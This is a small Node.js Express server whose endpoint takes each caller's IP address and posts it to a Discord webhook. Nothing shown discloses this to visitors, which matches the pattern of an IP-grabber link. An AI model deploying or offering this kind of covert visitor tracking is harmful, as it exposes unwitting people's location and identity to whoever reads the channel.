const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

// Replace with your Discord webhook URL
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.use(express.static('public'));

app.get('/api/sendIp', (req, res) => {
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const message = {
        content: `User IP: ${userIp}`
    };

    axios.post(DISCORD_WEBHOOK_URL, message)
        .then(response => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending IP to Discord:', error);
            res.json({ success: false });
        });
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
